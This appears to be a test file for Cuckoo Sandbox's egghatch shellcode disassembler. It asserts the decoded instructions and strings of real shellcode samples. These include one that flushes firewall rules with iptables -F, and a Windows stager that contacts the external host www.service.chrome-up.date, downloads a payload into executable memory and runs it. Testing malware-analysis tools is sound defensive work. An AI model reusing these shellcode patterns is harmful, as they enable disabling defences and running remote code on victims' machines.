# Copyright (C) 2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - https://cuckoosandbox.org/.
# See the file "docs/LICENSE" for copying permission.

import json
import mock

from egghatch.shellcode import Shellcode

def test_sd():
    sc = Shellcode(open("tests/files/plain/sd.bin", "rb").read())
    assert json.loads(sc.to_json()) == {
        "bbl": [
            [0, 12],
            [12, 57],
            [57, 69],
        ],
        "text": [
            [0, "xor", "eax, eax"],
            [2, "xor", "ebx, ebx"],
            [4, "mov", "al, 2"],
            [6, "int", "0x80"],
            [8, "cmp", "eax, ebx"],
            [10, "jne", "0x39"],
            [12, "xor", "eax, eax"],
            [14, "push", "eax"],
            [15, "push", "0x462d"],
            [19, "mov", "esi, esp"],
            [21, "push", "eax"],
            [22, "push", "0x73656c62"],
            [27, "push", "0x61747069"],
            [32, "push", "0x2f6e6962"],
            [37, "push", "0x732f2f2f"],
            [42, "mov", "ebx, esp"],
            [44, "lea", "edx, dword ptr [esp + 0x10]"],
            [48, "push", "eax"],
            [49, "push", "esi"],
            [50, "push", "esp"],
            [51, "mov", "ecx, esp"],
            [53, "mov", "al, 0xb"],
            [55, "int", "0x80"],
            [57, "mov", "ebx, eax"],
            [59, "xor", "eax, eax"],
            [61, "xor", "ecx, ecx"],
            [63, "xor", "edx, edx"],
            [65, "mov", "al, 7"],
            [67, "int", "0x80"],
        ],
        "data": [],
    }

def test_bin1():
    sc = Shellcode(open("tests/files/plain/1.bin", "rb").read())
    assert json.loads(sc.to_json()) == {
        "bbl": mock.ANY,
        "text": mock.ANY,
        "data": [
            # TODO See also the TODO items in test_blocks.
            [0x06, mock.ANY],
            [0xb9, "/282yG\x00"],
            [0x14b, "www.service.chrome-up.date\x00"],
        ],
    }

def test_bin2():
    sc = Shellcode(open("tests/files/plain/1.bin", "rb").read())
    assert json.loads(sc.to_json()) == {
        "bbl": mock.ANY,
        "text": [
            [0, "cld", ""],
            [1, "call", "0x88"],
            [136, "pop", "ebp"],
            [137, "push", "0x74656e"],
            [142, "push", "0x696e6977"],
            [147, "push", "esp"],
            [148, "push", "0x726774c"],
            [153, "call", "ebp"],
            [155, "xor", "ebx, ebx"],
            [157, "push", "ebx"],
            [158, "push", "ebx"],
            [159, "push", "ebx"],
            [160, "push", "ebx"],
            [161, "push", "ebx"],
            [162, "push", "0xa779563a"],
            [167, "call", "ebp"],
            [169, "push", "ebx"],
            [170, "push", "ebx"],
            [171, "push", "3"],
            [173, "push", "ebx"],
            [174, "push", "ebx"],
            [175, "push", "0x1cec"],
            [180, "call", "0x145"],
            [192, "push", "eax"],
            [193, "push", "0xc69f8957"],
            [198, "call", "ebp"],
            [200, "mov", "esi, eax"],
            [202, "push", "ebx"],
            [203, "push", "0x84e03200"],
            [208, "push", "ebx"],
            [209, "push", "ebx"],
            [210, "push", "ebx"],
            [211, "push", "edi"],
            [212, "push", "ebx"],
            [213, "push", "esi"],
            [214, "push", "0x3b2e55eb"],
            [219, "call", "ebp"],
            [221, "xchg", "eax, esi"],
            [222, "push", "0xa"],
            [224, "pop", "edi"],
            [225, "push", "0x3380"],
            [230, "mov", "eax, esp"],
            [232, "push", "4"],
            [234, "push", "eax"],
            [235, "push", "0x1f"],
            [237, "push", "esi"],
            [238, "push", "0x869e4675"],
            [243, "call", "ebp"],
            [245, "push", "ebx"],
            [246, "push", "ebx"],
            [247, "push", "ebx"],
            [248, "push", "ebx"],
            [249, "push", "esi"],
            [250, "push", "0x7b18062d"],
            [255, "call", "ebp"],
            [257, "test", "eax, eax"],
            [259, "jne", "0x10f"],
            [261, "dec", "edi"],
            [262, "jne", "0xe1"],
            [264, "push", "0x56a2b5f0"],
            [269, "call", "ebp"],
            [271, "push", "0x40"],
            [273, "push", "0x1000"],
            [278, "push", "0x400000"],
            [283, "push", "ebx"],
            [284, "push", "0xe553a458"],
            [289, "call", "ebp"],
            [291, "xchg", "eax, ebx"],
            [292, "push", "ebx"],
            [293, "push", "ebx"],
            [294, "mov", "edi, esp"],
            [296, "push", "edi"],
            [297, "push", "0x2000"],
            [302, "push", "ebx"],
            [303, "push", "esi"],
            [304, "push", "0xe2899612"],
            [309, "call", "ebp"],
            [311, "test", "eax, eax"],
            [313, "je", "0x108"],
            [315, "mov", "eax, dword ptr [edi]"],
            [317, "add", "ebx, eax"],
            [319, "test", "eax, eax"],
            [321, "jne", "0x128"],
            [323, "pop", "eax"],
            [324, "ret", ""],
            [325, "pop", "edi"],
            [326, "call", "0xc0"],
        ],
        "data": mock.ANY,
    }